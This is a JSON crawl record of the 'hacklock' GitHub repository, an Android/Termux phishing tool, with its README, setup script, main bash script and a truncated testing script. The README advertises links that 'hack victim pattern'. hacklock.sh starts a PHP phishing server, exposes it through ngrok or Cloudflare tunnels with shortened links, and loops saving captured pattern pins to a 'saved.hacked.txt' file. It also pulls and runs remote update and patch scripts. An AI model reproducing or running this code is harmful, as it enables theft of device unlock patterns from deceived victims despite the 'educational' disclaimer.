{
  "metadata": {
    "timestamp": 1736568452426,
    "page": 426,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQyOQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "noob-hackers/hacklock",
      "stars": 1862,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.037109375,
          "content": "MIT License\n\nCopyright (c) 2020 N17R0\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 6.130859375,
          "content": "<p align=\"center\">\n<a href=\"https://bit.ly/3gnUcN3\"><img title=\"Made in INDIA\" src=\"https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge\"></a>\n</p>\n<p align=\"center\">\n<a href=\"https://bit.ly/3gnUcN3\"><img title=\"Made in INDIA\" src=\"https://img.shields.io/badge/Tool-Hacklock-green.svg\"></a>\n<a href=\"https://bit.ly/3gnUcN3\"><img title=\"Version\" src=\"https://img.shields.io/badge/Version-2.0-green.svg?style=flat-square\"></a>\n<a href=\"https://bit.ly/3gnUcN3\"><img title=\"Maintainence\" src=\"https://img.shields.io/badge/Maintained%3F-yes-green.svg\"></a>\n</p>\n<p align=\"center\">\n<a href=\"https://bit.ly/3gnUcN3\"><img title=\"Hacklock\" src=\"https://user-images.githubusercontent.com/49580304/96666403-e4418800-130b-11eb-90bc-938e0825e610.jpg\"></a>\n</p>\n<p align=\"center\">\n<a href=\"https://github.com/noob-hackers\"><img title=\"Github\" src=\"https://img.shields.io/badge/noob-hackers-brightgreen?style=for-the-badge&logo=github\"></a>\n<a href=\"https://rebrand.ly/noobhackers\"><img title=\"YouTube\" src=\"https://img.shields.io/badge/YouTube-Noob Hackers-red?style=for-the-badge&logo=Youtube\"></a>\n</p>\n<p align=\"center\">\n<a href=\"https://github.com/noob-hackers\"><img title=\"Language\" src=\"https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?v=103\"></a>\n<a href=\"https://github.com/noob-hackers\"><img title=\"Followers\" src=\"https://img.shields.io/github/followers/noob-hackers?color=blue&style=flat-square\"></a>\n<a href=\"https://github.com/noob-hackers\"><img title=\"Stars\" src=\"https://img.shields.io/github/stars/noob-hackers/hacklock?color=red&style=flat-square\"></a>\n<a href=\"https://github.com/noob-hackers\"><img title=\"Forks\" src=\"https://img.shields.io/github/forks/noob-hackers/hacklock?color=red&style=flat-square\"></a>\n<a href=\"https://github.com/noob-hackers\"><img title=\"Watching\" src=\"https://img.shields.io/github/watchers/noob-hackers/hacklock?label=Watchers&color=blue&style=flat-square\"></a>\n<a href=\"https://github.com/noob-hackers\"><img title=\"Licence\" src=\"https://img.shields.io/badge/License-MIT-blue.svg\"></a>\n</p>\n\n## ABOUT TOOL :\n\nHacklock is a bash based script which is officially termux from this tool in just one click you can generate pattern phishing tool which can hack victim pattern and. This tool works on both rooted Android device and Non-rooted Android device.\n\n<p align=\"center\"><a href=\"https://rebrand.ly/noobhacktube\"><img title=\"Noob Hackers\" src=\"https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg\"></a>\n</p>\n\n## AVAILABLE ON :\n\n* Termux\n\n### TESTED ON :\n\n* Termux\n\n### REQUIREMENTS :\n* internet 100 MB\n* php\n* storage 1 GB\n* ngrok\n\n## FEATURES :\n* [+] Real pattern hacking !\n* [+] Updated maintainence !\n* [+] Ngrok link\n* [+] Cloudflare link\n* [+] Easy for Beginners !\n\n## INSTALLATION [Termux] :\n\n* `apt-get update -y`\n* `apt-get upgrade -y`\n* `pkg install python -y`\n* `pkg install python2 -y`\n* `pkg install git -y`\n* `pip install lolcat`\n* `git clone https://github.com/noob-hackers/hacklock`\n* `cd $HOME`\n* `ls`\n* `cd hacklock`\n*  `ls`\n* `bash setup`\n* `bash hacklock.sh`\n```\n[+]--Now you need internet connection to continue further process and Turn on your device hotspot to get link...\n\n[+]--You will recieve patter pin in below image you can see pattern with numbers\n\n[+]--You can select any option by clicking on your keyboard\n\n[+]--Note:- Don't delete any of the scripts included in core files\n\n```\n## USAGE OPTIONS [Termux] :\n\n__HACK PATTERN__ :\n- From this option you can create phishing pattern link which get keys of victim pattern after he used this link\n\n__ABOUT__ :\n- You can see details of the creator of script\n\n__UPDATE__ :\n- From this option you update the script if there is new update available\n\n__EXIT__ :\n- From this option you can exit from hacklock tool \n\n## SCREEN SHOTS [Termux]\n\n<br>\n<p align=\"center\">\n<img width=\"50%\" src=\"https://user-images.githubusercontent.com/49580304/96666397-e0156a80-130b-11eb-935a-f284bd33215b.jpg\"/>\n<img width=\"45%\" src=\"https://user-images.githubusercontent.com/49580304/96666392-ddb31080-130b-11eb-9056-cc427d87afcc.jpg\"/>\n<img width=\"48%\" src=\"https://user-images.githubusercontent.com/49580304/78964248-31e86700-7b17-11ea-8696-7dbf89b4d7de.jpg\"/>\n</p>\n\n## WATCH VIDEO [Termux]\n\n[![des](https://user-images.githubusercontent.com/49580304/96466915-3c2ea080-11df-11eb-8328-100ca165c12c.jpg)](https://rebrand.ly/rcentvideo)\n\n## CONNECT WITH US :\n\n[![Messenger](https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger)](https://rebrand.ly/fbmsnger)\n<a href=\"https://rebrand.ly/githubprof\"><img title=\"Github\" src=\"https://img.shields.io/badge/noob-hackers-brightgreen?style=for-the-badge&logo=github\"></a>\n[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://rebrand.ly/insgrm)\n[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://rebrand.ly/noobwebs)\n[![Instagram](https://img.shields.io/badge/LINKEDIN-CONNECT-red?style=for-the-badge&logo=linkedin)](https://rebrand.ly/linkedinprof)\n[![Instagram](https://img.shields.io/badge/FACEBOOK-LIKE-red?style=for-the-badge&logo=facebook)](https://rebrand.ly/fsbpage)\n[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://rebrand.ly/telegramchnl)\n[![Instagram](https://img.shields.io/badge/WHATSAPP-JOINGROUP-red?style=for-the-badge&logo=whatsapp)](https://rebrand.ly/hckrgroups)\n[![Instagram](https://img.shields.io/badge/DISCUSSION-FORUM-blue?style=for-the-badge&logo=forum)](https://rebrand.ly/nhforums)\n<a href=\"https://rebrand.ly/noobhackers\"><img title=\"YouTube\" src=\"https://img.shields.io/badge/YouTube-Noob Hackers-red?style=for-the-badge&logo=Youtube\"></a>\n\n## BUY ME A COFFEE :\n\n<p align=\"center\">\n<a href=\"https://rebrand.ly/BuyCoffee\"><img title=\"Noob Hackers\" src=\"https://camo.githubusercontent.com/ae8af018f80649f3d379eb23dbf59acceaffa24e/68747470733a2f2f6c69626572617061792e636f6d2f6173736574732f776964676574732f646f6e6174652e737667\"></a>\n</p>\n\n## WARNING : \n***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***\n"
        },
        {
          "name": "core",
          "type": "tree",
          "content": null
        },
        {
          "name": "hacklock.sh",
          "type": "blob",
          "size": 9.5302734375,
          "content": "#!data/datacom.termux/files/usr/bin/bash\n# HACKLOCK V2.0\n########### BY NITRO ###########\n#    This Tool Is For Android  #\n#   Pattern Penetraion testing #\n#   web: www.noob-hackers.com  #\n# You can copy but give credits#\n# Any feedback start issue     #\n######---Noob Hackers----######\n\n####### Checks if setup file exists #######\nclear\nloc=/data/data/com.termux/files/home/hacklock/setup\nif [ -f \"$loc\" ]; then\ncd $HOME/hacklock\nbash setup\nfi\nclear\n\n####### Check if update available #######\ncheck(){\nif wget --spider https://raw.githubusercontent.com/noob-hackers/hacklock/master/update.v1.4 2>/dev/null; then\ncd $HOME/hacklock/core/update\necho \"pin\" > update.txt\nelse\necho\nfi\n}\ncheck\n####### Update file execute #######\noption(){\nif [ -f \"$HOME/hacklock/core/update/update.txt\" ];then\ncd $HOME/hacklock/core/update\nbash update.sh\nelse\necho \" \"\nfi\n}\noption\n\n####### Check patch updates #######\ncheck1(){\nif wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then\ncd $HOME/hacklock/core/update\necho \"ttttt\" > patch.txt\nelse\necho\nfi\n}\ncheck1\n\n####### Execute downloaded patch file #######\noption1(){\nif [ -f \"$HOME/mrphish/core/update/patch.txt\" ];then\ncd $HOME/hacklock/core/update\nbash patch.sh\nelse\necho \" \"\nfi\n}\noption1\n\n####### Check if the pacages available #######\ndependencies() {\ncommand -v php > /dev/null 2>&1 || { echo >&2 \"I require Php but it's not installed. Install it. Aborting.\"; exit 1; }\ncommand -v curl > /dev/null 2>&1 || { echo >&2 \"I require Curl but it's not installed. Install it. Aborting.\"; exit 1; }\ncommand -v wget > /dev/null 2>&1 || { echo >&2 \"I require Wget but it's not installed. Install it. Aborting.\"; exit 1; }\n}\n\n####### Menu of the tool #######\nmenu() {\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m1\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Check pattern\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m2\\e[0m\\e[1;92m]\\e[0m\\e[1;93m More Tools\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m3\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Chat\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m4\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Fix \\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m5\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Follow\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m6\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Update\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m7\\e[0m\\e[1;92m]\\e[0m\\e[1;93m About \\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m8\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Subscribe\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m9\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Exit\\e[0m\\n\"\nread -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Choose an option: \\e[0m' option\n\nif [[ $option == 1 || $option == 01 ]]; then\nserver=\"pattern\"\nstart1\nelif [[ $option == 2 || $option == 02 ]]; then\nam start -a android.intent.action.VIEW -d https://bit.ly/3aP8DJD > /dev/null 2>&1 \nelif [[ $option == 3 || $option == 03 ]]; then\nam start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1 \nelif [[ $option == 4 || $option == 04 ]]; then\nfixer\nelif [[ $option == 5 || $option == 05 ]]; then\nam start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1 \nelif [[ $option == 6 || $option == 06 ]]; then\ncd $HOME/hacklock/core/update/\nbash update.sh\nelif [[ $option == 7 || $option == 07 ]]; then\ncd $HOME/hacklock/core/about/\nbash about.sh\nelif [[ $option == 8 || $option == 08 ]]; then\nam start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 \nelif [[ $option == 9 ]]; then\nexit 1\nelse\nprintf \"\\e[1;93m [!] Invalid option!\\e[0m\\n\"\nsleep 1\nclear\nbanner\ndependencies\nmenu\nfi\n}\n\n####### Stop background execution #######\nstop() {\ncheckngrok=$(ps aux | grep -o \"ngrok\" | head -n1)\ncheckphp=$(ps aux | grep -o \"php\" | head -n1)\ncheckcloud=$(ps aux | grep -o \"cloudflared\" | head -n1)\ncheckproot=$(ps aux | grep -o \"proot\" | head -n1)\n\nif [[ $checkngrok == *'ngrok'* ]]; then\npkill -f -2 ngrok > /dev/null 2>&1\nkillall -2 ngrok > /dev/null 2>&1\nfi\n\nif [[ $checkphp == *'php'* ]]; then\npkill -f -2 php > /dev/null 2>&1\nkillall -2 php > /dev/null 2>&1\nfi\n\nif [[ $checkproot == *'proot'* ]]; then\npkill -f -2 proot > /dev/null 2>&1\nkillall -2 proot > /dev/null 2>&1\nfi\n\nif [[ $checkcloud == *'cloudflared'* ]]; then\npkill -f -2 cloudflared > /dev/null 2>&1\nkillall cloudflared > /dev/null 2>&1\nfi\n\nif [[ -e sendlink ]]; then\nrm -rf sendlink\nfi\n}\n\n####### Banner for interface #######\nbanner() {\nprintf \"\\n\"\nprintf \"\\e[1;92m  _|    _|                      _|        _|                            _|\\e[0m\\n\"\nprintf \"\\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|  _|    _|          _|_|      _|_|_|  _|  _| \\e[0m\\n\"\nprintf \"\\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|        _|_\\e[0m\\n\"\nprintf \"\\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\\e[0m\\n\"\nprintf \"\\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v2.0 \\e[0m\\n\"\nprintf \"\\n\"\nprintf \"                        \\e[104m\\e[1;77m  >>  Script By N17R0 << \\e[0m\\n\"\nprintf \"\\n\"\nprintf \"                 \\e[100m\\e[1;77m >>  Youtube Channel : \\e[1;96m Noob Hackers \\e[100m\\e[1;77m << \\e[0m\\n\"\nprintf \"\\n\"\n}\n\n####### Catch creds #######\ncatch_cred() {\nIFS=$'\\n'\npassword=$(grep -o 'password : .*' $HOME/hacklock/core/pattern/usernames.txt | cut -d \":\" -f2)\nprintf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m]\\e[0m\\e[1;92m Pattern-pin:\\e[0m\\e[1;77m %s\\n\\e[0m\" $password\ncat $HOME/hacklock/core/pattern/usernames.txt >> $HOME/hacklock/core/pattern/saved.hacked.txt\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Saved:\\e[0m\\e[1;77m core/main/saved.hacked.txt\\e[0m\\n\"\nprintf \"\\n\"\nprintf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\\e[0m\\n\"\n}\n\n####### Server start/run #######\nstart() {\nif [[ -e \"$HOME/hacklock/core/pattern/ip.txt\" ]]; then\nrm -rf $HOME/hacklock/core/pattern/ip.txt\nfi\n\nif [[ -e \"$HOME/hacklock/core/pattern/usernames.txt\" ]]; then\nrm -rf $HOME/hacklock/core/pattern/usernames.txt\nfi\n\nif [[ -e \"$HOME/hacklock/cloudflare-log\" ]]; then\nrm -rf $HOME/hacklock/cloudflare-log\nfi\n\nif [[ -e \"$HOME/hacklock/ngrok\" ]]; then\necho \" \"\nelse\ncd $HOME/hacklock\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Downloading Ngrok...\\n\"\n##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1\nsleep 20\nif [[ -e \"$HOME/hacklock/ngrok\" ]]; then\n##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs chmod +x ngrok\nsleep 2.0\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Ngrok downloaded successfully.\\n\"\nelse\nprintf \"\\e[1;93m[!] Download error... \\e[0m\\n\"\nexit 1\nfi\nfi\n\nif [[ -e \"$HOME/hacklock/cloudflared\" ]]; then\necho \" \"\nelse\ncd $HOME/hacklock                                                                                           \nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Downloading Cloudflare...\\n\"\nwget -O cloudflared https://github.com/cloudflare/cloudflared/releases/download/2021.10.3/cloudflared-linux-arm64 > /dev/null 2>&1\nsleep 20\nif [[ -e \"$HOME/hacklock/cloudflared\" ]]; then\nchmod +x cloudflared\nsleep 2.0\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] cloudflare downloaded successfully.\\n\"\nelse\nprintf \"\\e[1;93m[!] Download error... \\e[0m\\n\"\nexit 1\nfi\nfi\n####### Server start process #######\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting php server...\\n\"\ncd $HOME/hacklock/core/pattern && php -S 127.0.0.1:5678 > /dev/null 2>&1 & \nsleep 5\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting forward servers...\\n\"\n./ngrok http 127.0.0.1:5678 > /dev/null 2>&1 &\ntermux-chroot ./cloudflared -url 127.0.0.1:5678 --logfile $HOME/hacklock/cloudflare-log > /dev/null 2>&1 &\nsleep 20\nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[0-9A-Za-z.-]*\\.ngrok.io\")\nflare=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' \"$HOME/hacklock/cloudflare-log\")\n##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONsprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] (NGROK) link:\\e[0m\\e[1;77m %s\\e[0m\\n\" $link\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] (Cloud Flare) link:\\e[0m\\e[1;77m %s\\e[0m\\n\" $flare\n##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs ngrok_ip=$(curl -s \"http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link\" | head -n1)\n##### NGROK HAS BEEN DISABLED DUE TO SOME TERMS AND CONDITIONs printf '\\n\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Ngrok Short:\\e[0m\\e[1;77m %s \\n' $ngrok_ip\ncloud_ip=$(curl -s \"http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$flare\" | head -n1)\nprintf '\\n\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Cloud Short:\\e[0m\\e[1;77m %s \\n' $cloud_ip\nprintf \"\\n\"\ncheckfound\n}\n\n####### Remove sendlink file #######\nstart1() {\nif [[ -e sendlink ]]; then\nrm -rf sendlink\nfi\nstart\n}\n\n####### Fix ngrok issue #######\nfixer(){\nclear\ncd $HOME\nls -a >/dev/null 2>&1\nrm -rf .ngrok2 >/dev/null 2>&1\nprintf \"\\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\\e[0m\\n\"\nread -p $'\\n\\e[1;96m[\\e[0m\\e[1;92m+\\e[0m\\e[1;96m] NGROK AUTH CODE : \\e[0m' name\n./ngrok authtoken $name >/dev/null 2>&1\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] NGROK FIXED SUCCESSFULLY:\\e[0m\\e[1;77m %s\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] IF ITS NOT SOLVED THEN USE OPTION CHAT\\e[0m\\e[1;77m %s\\e[0m\\n\"\nsleep 6.0\nexit 1\n}\n\n####### Check found data #######\ncheckfound() {\nprintf \"\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Waiting For Pin,\\e[0m\\e[1;77m Press Ctrl + C to exit...\\e[0m\\n\"\nwhile [ true ]; do\nif [[ -e \"$HOME/hacklock/core/pattern/usernames.txt\" ]]; then\nprintf \"\\n\\e[1;93m[\\e[0m*\\e[1;93m]\\e[0m\\e[1;92m Pattern  Found!\\n\"\ncatch_cred\nrm -rf $HOME/hacklock/core/pattern/usernames.txt\nfi\nsleep 0.5\ndone \n}\n\n####### Restart the tool #######\nbanner\ndependencies\nmenu\n"
        },
        {
          "name": "setup",
          "type": "blob",
          "size": 1.4287109375,
          "content": "clear\ncenter() {\n  termwidth=$(stty size | cut -d\" \" -f2)\n  padding=\"$(printf '%0.1s' ={1..500})\"\n  printf '%*.*s %s %*.*s\\n' 0 \"$(((termwidth-2-${#1})/2))\" \"$padding\" \"$1\" 0 \"$(((termwidth-1-${#1})/2))\" \"$padding\"\n}\necho -e \"\\033[92m\"\ncenter \"HACKLOCK SETUP\"\ncod=\"\\033[0m\"\no=\"\\033[91m\"\ngrn=\"\\033[92m\"\nblu=\"\\033[34m\"\nmsf=\"6.0.27\"\nmob=$(uname -o)\narc=$(dpkg --print-architecture)\nstr=$(du -hs)\nkrn=$(uname -s)\n#ip=$(curl -s https://api.ipify.org)\nAVL=`df -h /storage/emulated | awk '{ print $4 }' | tail -1`\necho -e \"\n$grn$cod STORAGE=$o\"$AVL\"$grn\n$grn$cod ARCHITECTURE=$o\"$arc\"$grn\n$grn$cod OS=$o\"$mob\"$grn\n$grn$cod KERNEL=$o\"$krn\"$grn\n\n------------------------------------\n|$grn FOLLLOW:$cod github.com/noob-hackers $grn|$grn\n|$grn SUBSCRIBE:$cod Noob Hackers          $grn|$grn\n|$grn CHAT:$cod wa.me/+919113948054        $grn|$grn\n------------------------------------$grn\n\"\necho -e \"\\e[92mTHIS MAY TAKE SOME TIME PLEASE WAIT.....\\e[0m\"\nsleep 5.0\necho -e \"\\033[92m\"\ncenter \"INSTALLING REQUIREED PACKAGES\"\necho -e \"\\e[34mPACKAGES BEING INSTALLED WAIT....\\e[0m\"\ncd $HOME\napt install -y php openssh wget git curl python termux-chroot > /dev/null 2>&1\necho -e \"\\e[34mPACKAGES INSTALLED SUCCESSFULLY....[\\e[92m✓\\e[34m]\\e[0m\"\necho -e \"\\033[92m\"\ncenter \"STARTING HACKLOCK\"\necho -e \"\\e[34mBOOTING HACKLOCK....\\e[0m\"\ncd $HOME/hacklock\nrm setup\nam start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 \ncd $HOME/hacklock\nbash hacklock.sh\n"
        },
        {
          "name": "testing.sh",
          "type": "blob",
          "size": 7.802734375,
          "content": "#!data/datacom.termux/files/usr/bin/bash\n\n########### BY NITRO ###########\n#    This Tool Is For Android  #\n#   Pattern Penetraion testing #\n#   web: www.noob-hackers.com  #\n# You can copy but give credits#\n# Any feedback start issue     #\n######---Noob Hackers----######\n\n####### Checks if setup file exists #######\nclear\nloc=/data/data/com.termux/files/home/hacklock/setup\nif [ -f \"$loc\" ]; then\ncd $HOME/hacklock\nbash setup\nfi\nclear\n\n####### Check if update available #######\ncheck(){\nif wget --spider https://raw.githubusercontent.com/noob-hackers/hacklock/master/update.v1.4 2>/dev/null; then\ncd $HOME/hacklock/core/update\necho \"pin\" > update.txt\nelse\necho\nfi\n}\ncheck\n####### Update file execute #######\noption(){\nif [ -f \"$HOME/hacklock/core/update/update.txt\" ];then\ncd $HOME/hacklock/core/update\nbash update.sh\nelse\necho \" \"\nfi\n}\noption\n\n####### Check patch updates #######\ncheck1(){\nif wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then\ncd $HOME/hacklock/core/update\necho \"ttttt\" > patch.txt\nelse\necho\nfi\n}\ncheck1\n\n####### Execute downloaded patch file #######\noption1(){\nif [ -f \"$HOME/mrphish/core/update/patch.txt\" ];then\ncd $HOME/hacklock/core/update\nbash patch.sh\nelse\necho \" \"\nfi\n}\noption1\n\n####### Check if the pacages available #######\ndependencies() {\ncommand -v php > /dev/null 2>&1 || { echo >&2 \"I require Php but it's not installed. Install it. Aborting.\"; exit 1; }\ncommand -v curl > /dev/null 2>&1 || { echo >&2 \"I require Curl but it's not installed. Install it. Aborting.\"; exit 1; }\ncommand -v wget > /dev/null 2>&1 || { echo >&2 \"I require Wget but it's not installed. Install it. Aborting.\"; exit 1; }\n}\n\n####### Menu of the tool #######\nmenu() {\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m1\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Hack pattern\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m2\\e[0m\\e[1;92m]\\e[0m\\e[1;93m More Tools\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m3\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Chat\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m4\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Fix \\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m5\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Follow\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m6\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Update\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m7\\e[0m\\e[1;92m]\\e[0m\\e[1;93m About \\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m8\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Subscribe\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m9\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Exit\\e[0m\\n\"\nread -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Choose an option: \\e[0m' option\n\nif [[ $option == 1 || $option == 01 ]]; then\nserver=\"pattern\"\nstart1\nelif [[ $option == 2 || $option == 02 ]]; then\nam start -a android.intent.action.VIEW -d https://bit.ly/3aP8DJD > /dev/null 2>&1 \nelif [[ $option == 3 || $option == 03 ]]; then\nam start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1 \nelif [[ $option == 4 || $option == 04 ]]; then\nfixer\nelif [[ $option == 5 || $option == 05 ]]; then\nam start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1 \nelif [[ $option == 6 || $option == 06 ]]; then\ncd $HOME/hacklock/core/update/\nbash update.sh\nelif [[ $option == 7 || $option == 07 ]]; then\ncd $HOME/hacklock/core/about/\nbash about.sh\nelif [[ $option == 8 || $option == 08 ]]; then\nam start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 \nelif [[ $option == 9 ]]; then\nexit 1\nelse\nprintf \"\\e[1;93m [!] Invalid option!\\e[0m\\n\"\nsleep 1\nclear\nbanner\ndependencies\nmenu\nfi\n}\n\n####### Stop background execution #######\nstop() {\ncheckngrok=$(ps aux | grep -o \"ngrok\" | head -n1)\ncheckphp=$(ps aux | grep -o \"php\" | head -n1)\ncheckcloud=$(ps aux | grep -o \"cloudflared\" | head -n1)\n\nif [[ $checkngrok == *'ngrok'* ]]; then\npkill -f -2 ngrok > /dev/null 2>&1\nkillall -2 ngrok > /dev/null 2>&1\nfi\n\nif [[ $checkphp == *'php'* ]]; then\npkill -f -2 php > /dev/null 2>&1\nkillall -2 php > /dev/null 2>&1\nfi\n\nif [[ $checkcloud == *'cloudflared'* ]]; then\npkill -f -2 cloudflared > /dev/null 2>&1\nkillall ssh > /dev/null 2>&1\nfi\n\nif [[ -e sendlink ]]; then\nrm -rf sendlink\nfi\n}\n\n####### Banner for interface #######\nbanner() {\nprintf \"\\n\"\nprintf \"\\e[1;92m  _|    _|                      _|        _|                            _|\\e[0m\\n\"\nprintf \"\\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|  _|    _|          _|_|      _|_|_|  _|  _| \\e[0m\\n\"\nprintf \"\\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|        _|_\\e[0m\\n\"\nprintf \"\\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\\e[0m\\n\"\nprintf \"\\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v1.2 \\e[0m\\n\"\nprintf \"\\n\"\nprintf \"                  \\e[104m\\e[1;77m  >>  Script By N17R0 << \\e[0m\\n\"\nprintf \"\\n\"\nprintf \"           \\e[100m\\e[1;77m >>  Youtube Channel : \\e[1;96m Noob Hackers \\e[100m\\e[1;77m << \\e[0m\\n\"\nprintf \"\\n\"\n}\n\n####### Catch creds #######\ncatch_cred() {\nIFS=$'\\n'\npassword=$(grep -o 'Pass:.*' $HOME/hacklock/core/pattern/usernames.txt | cut -d \":\" -f2)\nprintf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m]\\e[0m\\e[1;92m 